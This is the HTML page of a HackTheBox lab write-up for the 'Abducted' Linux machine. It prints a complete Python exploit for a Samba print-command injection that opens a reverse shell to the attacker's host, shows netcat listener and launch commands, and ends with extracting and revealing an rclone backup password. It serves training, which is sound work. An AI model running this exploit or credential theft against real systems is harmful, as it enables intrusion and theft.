@@ -1,0 +1,298 @@
+<!doctype html><html lang=en><head><title>HTB - Abducted · z3r0s</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="z3r0s"><meta name=description content='Difficulty: Medium | OS: Linux
+
+
+  Logo & Name Analysis - First Impressions
+  
+    
+    Link to heading
+  
+
+Before touching a single tool, the machine logo and name already give away a significant amount of information to an experienced player.
+
+  The Logo
+  
+    
+    Link to heading
+  
+
+The machine logo shows two penguins (Tux) standing side by side against a red background, enclosed in an orange circle. On HackTheBox, machine logos almost always hint directly at the technology or theme involved.
+What the logo tells us immediately:
+
+Two penguins (Tux): Linux is the operating system, and the dual penguins suggest multiple Linux users, user pivoting, or lateral movement between accounts.
+Red background: Danger or urgency, indicating a critical vulnerability or high-impact exploit path.
+Orange border: A warm, inviting exterior hiding something dangerous inside.
+
+
+  The Name
+  
+    
+    Link to heading
+  
+
+"Abducted" combined with the logo points toward:
+
+Something being taken or hijacked. In a cybersecurity context, this could mean session hijacking, credential theft, or file/user impersonation.
+A scenario where access is "abducted" from one user to another through misconfigurations or chained exploits.
+
+
+  The Instant Hypothesis
+  
+    
+    Link to heading
+  
+
+Combining name and logo before even running nmap:
+
+"This is a Linux machine with multiple user accounts. The name &#39;Abducted&#39; suggests credential theft or user impersonation. The dual penguins hint at lateral movement between Linux users. The foothold likely involves a Linux service exploit, and privilege escalation chains through multiple users via stolen credentials or misconfigured file permissions."
+
+This hypothesis is confirmed: the box chains through nobody -> scott -> marcus -> root via credential reuse and SMB misconfigurations.'><meta name=keywords content="hackthebox,htb,ctf,writeup,cybersecurity,hacking,pentesting,redteam"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB - Abducted"><meta name=twitter:description content='Difficulty: Medium | OS: Linux
+Logo & Name Analysis - First ImpressionsLink to headingBefore touching a single tool, the machine logo and name already give away a significant amount of information to an experienced player.
+The LogoLink to headingThe machine logo shows two penguins (Tux) standing side by side against a red background, enclosed in an orange circle. On HackTheBox, machine logos almost always hint directly at the technology or theme involved.
+What the logo tells us immediately:
+Two penguins (Tux): Linux is the operating system, and the dual penguins suggest multiple Linux users, user pivoting, or lateral movement between accounts. Red background: Danger or urgency, indicating a critical vulnerability or high-impact exploit path. Orange border: A warm, inviting exterior hiding something dangerous inside. The NameLink to heading"Abducted" combined with the logo points toward:
+Something being taken or hijacked. In a cybersecurity context, this could mean session hijacking, credential theft, or file/user impersonation. A scenario where access is "abducted" from one user to another through misconfigurations or chained exploits. The Instant HypothesisLink to headingCombining name and logo before even running nmap:
+"This is a Linux machine with multiple user accounts. The name &#39;Abducted&#39; suggests credential theft or user impersonation. The dual penguins hint at lateral movement between Linux users. The foothold likely involves a Linux service exploit, and privilege escalation chains through multiple users via stolen credentials or misconfigured file permissions."
+This hypothesis is confirmed: the box chains through nobody -> scott -> marcus -> root via credential reuse and SMB misconfigurations.'><meta property="og:url" content="https://z3r0s6.github.io/machines/abducted/"><meta property="og:site_name" content="z3r0s"><meta property="og:title" content="HTB - Abducted"><meta property="og:description" content='Difficulty: Medium | OS: Linux
+Logo & Name Analysis - First ImpressionsLink to headingBefore touching a single tool, the machine logo and name already give away a significant amount of information to an experienced player.
+The LogoLink to headingThe machine logo shows two penguins (Tux) standing side by side against a red background, enclosed in an orange circle. On HackTheBox, machine logos almost always hint directly at the technology or theme involved.
+What the logo tells us immediately:
+Two penguins (Tux): Linux is the operating system, and the dual penguins suggest multiple Linux users, user pivoting, or lateral movement between accounts. Red background: Danger or urgency, indicating a critical vulnerability or high-impact exploit path. Orange border: A warm, inviting exterior hiding something dangerous inside. The NameLink to heading"Abducted" combined with the logo points toward:
+Something being taken or hijacked. In a cybersecurity context, this could mean session hijacking, credential theft, or file/user impersonation. A scenario where access is "abducted" from one user to another through misconfigurations or chained exploits. The Instant HypothesisLink to headingCombining name and logo before even running nmap:
+"This is a Linux machine with multiple user accounts. The name &#39;Abducted&#39; suggests credential theft or user impersonation. The dual penguins hint at lateral movement between Linux users. The foothold likely involves a Linux service exploit, and privilege escalation chains through multiple users via stolen credentials or misconfigured file permissions."
+This hypothesis is confirmed: the box chains through nobody -> scott -> marcus -> root via credential reuse and SMB misconfigurations.'><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="machines"><meta property="article:published_time" content="2026-06-07T00:00:00+00:00"><meta property="article:modified_time" content="2026-06-07T00:00:00+00:00"><meta property="article:tag" content="HackTheBox"><meta property="article:tag" content="Linux"><meta property="article:tag" content="SMB"><meta property="article:tag" content="CVE-2026-4480"><meta property="article:tag" content="PrivEsc"><link rel=canonical href=https://z3r0s6.github.io/machines/abducted/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.f6b1b35a7b02521b25338f6cf58975f9980a6c12847763fe35a48307758cd1e7.css integrity="sha256-9rGzWnsCUhslM49s9Yl1+ZgKbBKEd2P+NaSDB3WM0ec=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.ad48f476275974885bdc03d5251e3cdbe1678c54a63ff772376b0ed2adc468dd.css integrity="sha256-rUj0didZdIhb3APVJR482+FnjFSmP/dyN2sO0q3EaN0=" crossorigin=anonymous media=screen><link rel=icon type=image/svg+xml href=/images/favicon.svg sizes=any><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-dark"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=https://z3r0s6.github.io/>z3r0s
+</a><input type=checkbox id=menu-toggle>
+<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/posts/>Posts</a></li><li class=navigation-item><a class=navigation-link href=/about/>About</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://z3r0s6.github.io/machines/abducted/>HTB - Abducted</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
+<time datetime=2026-06-07T00:00:00Z>June 7, 2026
+</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
+7-minute read</span></div><div class=categories><i class="fa-solid fa-folder" aria-hidden=true></i>
+<a href=/categories/machineschallenges/>Machines&amp;Challenges</a></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
+<span class=tag><a href=/tags/hackthebox/>HackTheBox</a>
+</span><span class=separator>•</span>
+<span class=tag><a href=/tags/linux/>Linux</a>
+</span><span class=separator>•</span>
+<span class=tag><a href=/tags/smb/>SMB</a>
+</span><span class=separator>•</span>
+<span class=tag><a href=/tags/cve-2026-4480/>CVE-2026-4480</a>
+</span><span class=separator>•</span>
+<span class=tag><a href=/tags/privesc/>PrivEsc</a></span></div></div></header><div class=post-content><img src=/logos/Abducted.png alt="Featured image"><p><strong>Difficulty:</strong> Medium | <strong>OS:</strong> Linux</p><hr><h2 id=logo--name-analysis---first-impressions>Logo & Name Analysis - First Impressions
+<a class=heading-link href=#logo--name-analysis---first-impressions><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><p>Before touching a single tool, the machine logo and name already give away a significant amount of information to an experienced player.</p><h3 id=the-logo>The Logo
+<a class=heading-link href=#the-logo><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><p>The machine logo shows two penguins (Tux) standing side by side against a red background, enclosed in an orange circle. On HackTheBox, machine logos almost always hint directly at the technology or theme involved.</p><p><strong>What the logo tells us immediately:</strong></p><ul><li><strong>Two penguins (Tux):</strong> Linux is the operating system, and the dual penguins suggest multiple Linux users, user pivoting, or lateral movement between accounts.</li><li><strong>Red background:</strong> Danger or urgency, indicating a critical vulnerability or high-impact exploit path.</li><li><strong>Orange border:</strong> A warm, inviting exterior hiding something dangerous inside.</li></ul><h3 id=the-name>The Name
+<a class=heading-link href=#the-name><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><p>"Abducted" combined with the logo points toward:</p><ul><li>Something being taken or hijacked. In a cybersecurity context, this could mean session hijacking, credential theft, or file/user impersonation.</li><li>A scenario where access is "abducted" from one user to another through misconfigurations or chained exploits.</li></ul><h3 id=the-instant-hypothesis>The Instant Hypothesis
+<a class=heading-link href=#the-instant-hypothesis><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><p>Combining name and logo before even running nmap:</p><blockquote><p><em>"This is a Linux machine with multiple user accounts. The name 'Abducted' suggests credential theft or user impersonation. The dual penguins hint at lateral movement between Linux users. The foothold likely involves a Linux service exploit, and privilege escalation chains through multiple users via stolen credentials or misconfigured file permissions."</em></p></blockquote><p>This hypothesis is confirmed: the box chains through <code>nobody</code> -> <code>scott</code> -> <code>marcus</code> -> <code>root</code> via credential reuse and SMB misconfigurations.</p><hr><h2 id=summary>Summary
+<a class=heading-link href=#summary><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><p>Abducted is a medium-difficulty Linux box centred around a Samba file server. The attack chain begins with unauthenticated RCE via CVE-2026-4480 (Samba print command <code>%J</code> injection), pivots through two local users using credential reuse and an insecure SMB share configuration, and escalates to root by abusing a group-writable systemd drop-in directory.</p><hr><h2 id=reconnaissance>Reconnaissance
+<a class=heading-link href=#reconnaissance><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><h3 id=nmap>Nmap
+<a class=heading-link href=#nmap><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>nmap -sCV &lt;MACHINE_IP&gt;
+</span></span></code></pre></div><p>Open ports:</p><table><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>22</td><td>SSH</td><td>OpenSSH 9.6p1 Ubuntu</td></tr><tr><td>139</td><td>NetBIOS</td><td>Samba smbd 4</td></tr><tr><td>445</td><td>SMB</td><td>Samba smbd 4</td></tr></tbody></table><h3 id=smb-enumeration>SMB Enumeration
+<a class=heading-link href=#smb-enumeration><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><p>Null session is permitted, revealing the server info:</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>rpcclient -U <span style=color:#a5d6ff>&#34;&#34;</span> -N 10.129.244.177 -c <span style=color:#a5d6ff>&#34;srvinfo&#34;</span>
+</span></span></code></pre></div><pre tabindex=0><code>ABDUCTED    Wk Sv PrQ Unx NT SNT Hartley Group Document Services
+os version: 6.1
+</code></pre><p>Share enumeration:</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>smbclient -L //10.129.244.177 -N
+</span></span></code></pre></div><pre tabindex=0><code>Sharename     Type    Comment
+HP-Reception  Printer Reception printer
+projects      Disk    Hartley Group Project Files
+transfer      Disk    Staff file transfer
+IPC$          IPC     IPC Service
+</code></pre><p>The <code>HP-Reception</code> printer share stands out immediately as a guest-accessible printer.</p><hr><h2 id=foothold---cve-2026-4480>Foothold - CVE-2026-4480
+<a class=heading-link href=#foothold---cve-2026-4480><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><h3 id=vulnerability>Vulnerability
+<a class=heading-link href=#vulnerability><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><p>CVE-2026-4480 is an unauthenticated RCE in Samba's printing subsystem (CVSS 10.0). When <code>printing = sysv</code> is configured and the <code>print command</code> contains the <code>%J</code> substitution character, Samba passes the client-controlled job description string to the shell without escaping metacharacters. By default, printer shares allow guest access, making this exploitable with no credentials.</p><p>The vulnerable configuration in <code>/etc/samba/shares.conf</code>:</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ini data-lang=ini><span style=display:flex><span><span style=color:#ff7b72>[HP-Reception]</span>
+</span></span><span style=display:flex><span>   comment <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>Reception printer
+</span></span></span><span style=display:flex><span><span style=color:#a5d6ff>   path = /var/spool/samba
+</span></span></span><span style=display:flex><span><span style=color:#a5d6ff>   printable = yes
+</span></span></span><span style=display:flex><span><span style=color:#a5d6ff>   guest ok = yes
+</span></span></span><span style=display:flex><span><span style=color:#a5d6ff>   print command = /usr/local/bin/printaudit %J %s</span>
+</span></span></code></pre></div><p>The <code>%J</code> is the job description field, which is attacker-controlled via the <code>DocumentInfo1.document_name</code> field in the SPOOLSS RPC protocol.</p><h3 id=exploit>Exploit
+<a class=heading-link href=#exploit><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><p>The PoC (by TheCyberGeek, available at <a href=https://github.com/TheCyberGeek/CVE-2026-4480-PoC class=external-link target=_blank rel=noopener>https://github.com/TheCyberGeek/CVE-2026-4480-PoC</a>) uses the Samba Python bindings to open the guest printer, set the document name to a shell injection payload, and trigger it via <code>EndDocPrinter</code>.</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#8b949e;font-style:italic>#!/usr/bin/env python3</span>
+</span></span><span style=display:flex><span><span style=color:#a5d6ff>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#a5d6ff>CVE-2026-4480 - Samba print-command (%J) injection -&gt; unauthenticated RCE.
+</span></span></span><span style=display:flex><span><span style=color:#a5d6ff>Made by TheCyberGeek @ HackTheBox
+</span></span></span><span style=display:flex><span><span style=color:#a5d6ff>&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72>import</span> <span style=color:#ff7b72>argparse</span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72>import</span> <span style=color:#ff7b72>sys</span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72>try</span>:
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>from</span> <span style=color:#ff7b72>samba.dcerpc</span> <span style=color:#ff7b72>import</span> spoolss
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>from</span> <span style=color:#ff7b72>samba.param</span> <span style=color:#ff7b72>import</span> LoadParm
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>from</span> <span style=color:#ff7b72>samba.credentials</span> <span style=color:#ff7b72>import</span> Credentials
+</span></span><span style=display:flex><span><span style=color:#ff7b72>except</span> <span style=color:#f0883e;font-weight:700>ImportError</span>:
+</span></span><span style=display:flex><span>    sys<span style=color:#ff7b72;font-weight:700>.</span>exit(<span style=color:#a5d6ff>&#34;[-] Samba Python bindings missing. Install with: sudo apt install python3-samba&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PRINTER_ACCESS_USE <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0x00000008</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72>def</span> <span style=color:#d2a8ff;font-weight:700>reverse_shell</span>(lhost, lport):
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>return</span> (<span style=color:#a5d6ff>&#34;setsid bash -c &#39;bash -i &gt;&amp; /dev/tcp/</span><span style=color:#a5d6ff>%s</span><span style=color:#a5d6ff>/</span><span style=color:#a5d6ff>%d</span><span style=color:#a5d6ff> 0&gt;&amp;1&#39; &gt;/dev/null 2&gt;&amp;1 &amp;</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>
+</span></span><span style=display:flex><span>            <span style=color:#ff7b72;font-weight:700>%</span> (lhost, lport))<span style=color:#ff7b72;font-weight:700>.</span>encode()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72>def</span> <span style=color:#d2a8ff;font-weight:700>exploit</span>(rhost, printer, body):
+</span></span><span style=display:flex><span>    lp <span style=color:#ff7b72;font-weight:700>=</span> LoadParm()
+</span></span><span style=display:flex><span>    lp<span style=color:#ff7b72;font-weight:700>.</span>load_default()
+</span></span><span style=display:flex><span>    creds <span style=color:#ff7b72;font-weight:700>=</span> Credentials()
+</span></span><span style=display:flex><span>    creds<span style=color:#ff7b72;font-weight:700>.</span>guess(lp)
+</span></span><span style=display:flex><span>    creds<span style=color:#ff7b72;font-weight:700>.</span>set_anonymous()
+</span></span><span style=display:flex><span>    binding <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#79c0ff>r</span><span style=color:#a5d6ff>&#34;ncacn_np:</span><span style=color:#a5d6ff>%s</span><span style=color:#a5d6ff>[\pipe\spoolss]&#34;</span> <span style=color:#ff7b72;font-weight:700>%</span> rhost
+</span></span><span style=display:flex><span>    iface <span style=color:#ff7b72;font-weight:700>=</span> spoolss<span style=color:#ff7b72;font-weight:700>.</span>spoolss(binding, lp, creds)
+</span></span><span style=display:flex><span>    handle <span style=color:#ff7b72;font-weight:700>=</span> iface<span style=color:#ff7b72;font-weight:700>.</span>OpenPrinter(<span style=color:#a5d6ff>&#34;</span><span style=color:#79c0ff>\\\\</span><span style=color:#a5d6ff>%s</span><span style=color:#79c0ff>\\</span><span style=color:#a5d6ff>%s</span><span style=color:#a5d6ff>&#34;</span> <span style=color:#ff7b72;font-weight:700>%</span> (rhost, printer), <span style=color:#a5d6ff>&#34;&#34;</span>,
+</span></span><span style=display:flex><span>                               spoolss<span style=color:#ff7b72;font-weight:700>.</span>DevmodeContainer(), PRINTER_ACCESS_USE)
+</span></span><span style=display:flex><span>    info <span style=color:#ff7b72;font-weight:700>=</span> spoolss<span style=color:#ff7b72;font-weight:700>.</span>DocumentInfo1()
+</span></span><span style=display:flex><span>    info<span style=color:#ff7b72;font-weight:700>.</span>document_name <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>&#34;|sh&#34;</span>                 <span style=color:#8b949e;font-style:italic># lands in %J</span>
+</span></span><span style=display:flex><span>    info<span style=color:#ff7b72;font-weight:700>.</span>output_file <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#79c0ff>None</span>
+</span></span><span style=display:flex><span>    info<span style=color:#ff7b72;font-weight:700>.</span>datatype <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>&#34;RAW&#34;</span>
+</span></span><span style=display:flex><span>    ctr <span style=color:#ff7b72;font-weight:700>=</span> spoolss<span style=color:#ff7b72;font-weight:700>.</span>DocumentInfoCtr()
+</span></span><span style=display:flex><span>    ctr<span style=color:#ff7b72;font-weight:700>.</span>level <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>1</span>
+</span></span><span style=display:flex><span>    ctr<span style=color:#ff7b72;font-weight:700>.</span>info <span style=color:#ff7b72;font-weight:700>=</span> info
+</span></span><span style=display:flex><span>    iface<span style=color:#ff7b72;font-weight:700>.</span>StartDocPrinter(handle, ctr)
+</span></span><span style=display:flex><span>    iface<span style=color:#ff7b72;font-weight:700>.</span>StartPagePrinter(handle)
+</span></span><span style=display:flex><span>    iface<span style=color:#ff7b72;font-weight:700>.</span>WritePrinter(handle, body, len(body))  <span style=color:#8b949e;font-style:italic># %s (spool body, run as script)</span>
+</span></span><span style=display:flex><span>    iface<span style=color:#ff7b72;font-weight:700>.</span>EndPagePrinter(handle)
+</span></span><span style=display:flex><span>    iface<span style=color:#ff7b72;font-weight:700>.</span>EndDocPrinter(handle)                  <span style=color:#8b949e;font-style:italic># triggers print command server-side</span>
+</span></span><span style=display:flex><span>    iface<span style=color:#ff7b72;font-weight:700>.</span>ClosePrinter(handle)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72>def</span> <span style=color:#d2a8ff;font-weight:700>main</span>():
+</span></span><span style=display:flex><span>    p <span style=color:#ff7b72;font-weight:700>=</span> argparse<span style=color:#ff7b72;font-weight:700>.</span>ArgumentParser(
+</span></span><span style=display:flex><span>        description<span style=color:#ff7b72;font-weight:700>=</span><span style=color:#a5d6ff>&#34;CVE-2026-4480 Samba print %J injection -&gt; reverse shell&#34;</span>)
+</span></span><span style=display:flex><span>    p<span style=color:#ff7b72;font-weight:700>.</span>add_argument(<span style=color:#a5d6ff>&#34;rhost&#34;</span>, help<span style=color:#ff7b72;font-weight:700>=</span><span style=color:#a5d6ff>&#34;target Samba host/IP&#34;</span>)
+</span></span><span style=display:flex><span>    p<span style=color:#ff7b72;font-weight:700>.</span>add_argument(<span style=color:#a5d6ff>&#34;lhost&#34;</span>, help<span style=color:#ff7b72;font-weight:700>=</span><span style=color:#a5d6ff>&#34;your listener IP (e.g. tun0)&#34;</span>)
+</span></span><span style=display:flex><span>    p<span style=color:#ff7b72;font-weight:700>.</span>add_argument(<span style=color:#a5d6ff>&#34;lport&#34;</span>, type<span style=color:#ff7b72;font-weight:700>=</span>int, help<span style=color:#ff7b72;font-weight:700>=</span><span style=color:#a5d6ff>&#34;your listener port&#34;</span>)
+</span></span><span style=display:flex><span>    p<span style=color:#ff7b72;font-weight:700>.</span>add_argument(<span style=color:#a5d6ff>&#34;-P&#34;</span>, <span style=color:#a5d6ff>&#34;--printer&#34;</span>, default<span style=color:#ff7b72;font-weight:700>=</span><span style=color:#a5d6ff>&#34;HP-Reception&#34;</span>,
+</span></span><span style=display:flex><span>                   help<span style=color:#ff7b72;font-weight:700>=</span><span style=color:#a5d6ff>&#34;guest printer share name (default: HP-Reception)&#34;</span>)
+</span></span><span style=display:flex><span>    p<span style=color:#ff7b72;font-weight:700>.</span>add_argument(<span style=color:#a5d6ff>&#34;-c&#34;</span>, <span style=color:#a5d6ff>&#34;--cmd&#34;</span>,
+</span></span><span style=display:flex><span>                   help<span style=color:#ff7b72;font-weight:700>=</span><span style=color:#a5d6ff>&#34;run this shell command instead of a reverse shell&#34;</span>)
+</span></span><span style=display:flex><span>    args <span style=color:#ff7b72;font-weight:700>=</span> p<span style=color:#ff7b72;font-weight:700>.</span>parse_args()
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>if</span> args<span style=color:#ff7b72;font-weight:700>.</span>cmd:
+</span></span><span style=display:flex><span>        body <span style=color:#ff7b72;font-weight:700>=</span> (args<span style=color:#ff7b72;font-weight:700>.</span>cmd<span style=color:#ff7b72;font-weight:700>.</span>rstrip(<span style=color:#a5d6ff>&#34;</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>) <span style=color:#ff7b72;font-weight:700>+</span> <span style=color:#a5d6ff>&#34;</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>)<span style=color:#ff7b72;font-weight:700>.</span>encode()
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>else</span>:
+</span></span><span style=display:flex><span>        body <span style=color:#ff7b72;font-weight:700>=</span> reverse_shell(args<span style=color:#ff7b72;font-weight:700>.</span>lhost, args<span style=color:#ff7b72;font-weight:700>.</span>lport)
+</span></span><span style=display:flex><span>    print(<span style=color:#a5d6ff>&#34;[*] target   : </span><span style=color:#a5d6ff>%s</span><span style=color:#a5d6ff> (</span><span style=color:#79c0ff>\\\\</span><span style=color:#a5d6ff>%s</span><span style=color:#79c0ff>\\</span><span style=color:#a5d6ff>%s</span><span style=color:#a5d6ff>)&#34;</span> <span style=color:#ff7b72;font-weight:700>%</span> (args<span style=color:#ff7b72;font-weight:700>.</span>rhost, args<span style=color:#ff7b72;font-weight:700>.</span>rhost, args<span style=color:#ff7b72;font-weight:700>.</span>printer))
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>if</span> <span style=color:#ff7b72;font-weight:700>not</span> args<span style=color:#ff7b72;font-weight:700>.</span>cmd:
+</span></span><span style=display:flex><span>        print(<span style=color:#a5d6ff>&#34;[*] callback : </span><span style=color:#a5d6ff>%s</span><span style=color:#a5d6ff>:</span><span style=color:#a5d6ff>%d</span><span style=color:#a5d6ff>  (start a listener first: nc -lvnp </span><span style=color:#a5d6ff>%d</span><span style=color:#a5d6ff>)&#34;</span>
+</span></span><span style=display:flex><span>              <span style=color:#ff7b72;font-weight:700>%</span> (args<span style=color:#ff7b72;font-weight:700>.</span>lhost, args<span style=color:#ff7b72;font-weight:700>.</span>lport, args<span style=color:#ff7b72;font-weight:700>.</span>lport))
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>try</span>:
+</span></span><span style=display:flex><span>        exploit(args<span style=color:#ff7b72;font-weight:700>.</span>rhost, args<span style=color:#ff7b72;font-weight:700>.</span>printer, body)
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>except</span> <span style=color:#f0883e;font-weight:700>Exception</span> <span style=color:#ff7b72>as</span> e:
+</span></span><span style=display:flex><span>        sys<span style=color:#ff7b72;font-weight:700>.</span>exit(<span style=color:#a5d6ff>&#34;[-] exploit failed: </span><span style=color:#a5d6ff>%s</span><span style=color:#a5d6ff>&#34;</span> <span style=color:#ff7b72;font-weight:700>%</span> e)
+</span></span><span style=display:flex><span>    print(<span style=color:#a5d6ff>&#34;[+] print job submitted -- check your listener&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72>if</span> <span style=color:#79c0ff>__name__</span> <span style=color:#ff7b72;font-weight:700>==</span> <span style=color:#a5d6ff>&#34;__main__&#34;</span>:
+</span></span><span style=display:flex><span>    main()
+</span></span></code></pre></div><h3 id=usage>Usage
+<a class=heading-link href=#usage><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#8b949e;font-style:italic># Terminal 1: start listener</span>
+</span></span><span style=display:flex><span>nc -lvnp <span style=color:#a5d6ff>4444</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic># Terminal 2: fire the exploit</span>
+</span></span><span style=display:flex><span>python3 exploit.py 10.129.244.177 10.10.14.100 <span style=color:#a5d6ff>4444</span>
+</span></span></code></pre></div><p>This lands a shell as <code>nobody</code> inside <code>/var/spool/samba</code>.</p><hr><h2 id=user-flag-scott>User Flag (scott)
+<a class=heading-link href=#user-flag-scott><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><h3 id=credential-discovery>Credential Discovery
+<a class=heading-link href=#credential-discovery><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><p>Navigating to <code>/opt/offsite-backup</code> reveals an rclone configuration used to sync project files to an offsite SFTP server:</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>cat /opt/offsite-backup/rclone.conf
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ini data-lang=ini><span style=display:flex><span><span style=color:#ff7b72>[offsite]</span>
+</span></span><span style=display:flex><span>type <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>sftp</span>
+</span></span><span style=display:flex><span>host <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>backup.hartley-group.internal</span>
+</span></span><span style=display:flex><span>user <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>svc-backup</span>
+</span></span><span style=display:flex><span>pass <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw</span>
+</span></span></code></pre></div><p>The password is rclone-obfuscated. Revealing it:</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
